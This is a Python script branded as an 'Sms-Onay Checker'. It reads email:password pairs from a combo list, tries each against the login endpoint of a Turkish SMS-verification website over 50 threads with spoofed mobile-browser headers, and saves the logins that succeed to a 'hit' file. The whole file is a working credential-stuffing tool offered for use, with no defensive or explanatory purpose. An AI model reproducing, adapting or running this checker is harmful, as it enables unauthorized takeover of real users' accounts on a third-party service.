import requests
import threading
import os
from termcolor import colored
from cfonts import render
os.system("pip install threading")
os.system("pip install requests")
os.system("pip install python-cfonts")
os.system("pip install termcolor")

E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'

bss = 0
uus = 0
hit = 0
bad = 0

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] TeleGram  : {B} @Roox_00    |
|{Z}[+] Instagram  : {B}JED ~ ARCHIVE |
|{Z}[+] Tool  : {B} Sms-Onay Checker |
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')



cookie_çek = 'https://hizlismsonay.com.tr/ajax/login'
api = 'https://hizlismsonay.com.tr/ajax/login'
headers = {
    'authority': 'hizlismsonay.com.tr',
    'accept': '*/*',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    
    'origin': 'https://hizlismsonay.com.tr',
    'referer': 'https://hizlismsonay.com.tr/login',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

def check_log(email, password):
    data = {
        'email': email,
        'password': password
    }
    with requests.Session() as session:
        response = session.post(cookie_çek, data=data)
        if response.status_code == 200:
            cookies = session.cookies.get_dict()
            response = session.post(api, cookies=cookies, headers=headers, data=data)
            if '"success":false' in response.text:
                print(colored(f"Bad: {email}:{password}", 'red'))
            else:
                print(colored(f"Hit: {email}:{password}", 'green'))
                with open('hit_sms.txt', 'a') as hit_file:
                    hit_file.write(f"{email}:{password}\n")
        else:
            print(colored(f"Bad: {email}:{password}", 'red'))

def check(file_path, threads_count):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    threads = []
    for line in lines:
        email, password = line.strip().split(":")
        while len(threads) >= threads_count:
            for thread in threads:
                thread.join()
            threads = [t for t in threads if t.is_alive()] 
        thread = threading.Thread(target=check_log, args=(email, password))
        thread.start()
        threads.append(thread)
        
    for thread in threads:
        thread.join()

Ulus = input("Dosya adını gir: ")
theardlar = 50
check(Ulus, theardlar)
